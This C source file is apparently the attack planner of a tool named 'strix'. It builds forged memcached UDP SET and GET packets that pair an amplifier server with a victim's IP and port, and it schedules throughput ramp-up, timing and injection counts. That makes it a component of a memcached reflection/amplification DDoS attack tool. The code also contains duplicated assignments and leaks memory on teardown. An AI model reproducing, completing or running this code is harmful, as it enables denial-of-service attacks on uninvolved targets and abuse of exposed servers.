#include "strix.h"
#include "packetforge.h"
#include "planner.h"

static AttackData * _createAttackData( AttackDraft *draft )
{
  AttackData *newData;

  memalloc( (void *)&newData, sizeof( AttackData ), __func__); 
  newData->setPacket = ForgeMemcachedUDP( draft->amp_ip, draft->target_ip, draft->target_port, draft->amp_port, MEMCACHED_SET );
  newData->getPacket = ForgeMemcachedUDP( draft->amp_ip, draft->target_ip, draft->target_port, draft->amp_port, MEMCACHED_GET );
  newData->initialThroughput = draft->initialThroughput;
  newData->incrementThroughput = draft->incrementThroughput;
  newData->initialThroughput = draft->initialThroughput;
  newData->incrementThroughput = draft->incrementThroughput;
  newData->timeFrequency = draft->timeFrequency;
  newData->nInjections = draft->nInjections;
  newData->atkStatus = Attack_Status_Created;
  
  memalloc( (void *)&newData->target_ip, strlen(draft->target_ip) + 1, __func__);
  memcpy( newData->target_ip, draft->target_ip, strlen(draft->target_ip) + 1);

  memalloc( (void *)&newData->amp_ip, strlen(draft->amp_ip) + 1, __func__);
  memcpy( newData->amp_ip, draft->amp_ip, strlen(draft->amp_ip) + 1);

  return newData;
}

AttackPlan * Planner( AttackDraft *draft, int draftSize )
{
  AttackPlan *plan = NULL;

  assert( NULL != draft );
  assert(draftSize > 0);

  memalloc( (void *)&plan, sizeof(AttackPlan), __func__);
  memalloc( (void *)&plan->atkPlans, sizeof(AttackData) * draftSize, __func__);
  plan->totalPlans = draftSize;

  for(int i = 0; i < draftSize; i++){
    plan->atkPlans[i] = _createAttackData( &draft[i] );   
  }

  return plan;
}

void DestroyPlan( AttackPlan **plan )
{
  if( NULL == *plan ){
    return;
  }

  for(int i = 0; i < (*plan)->totalPlans; i++){
    ReleasePacket( &((*plan)->atkPlans[i]->getPacket) );
    ReleasePacket( &((*plan)->atkPlans[i]->setPacket) );
    free((*plan)->atkPlans[i]->target_ip);
    free((*plan)->atkPlans[i]->amp_ip);
  }
  
  free(*plan);
}
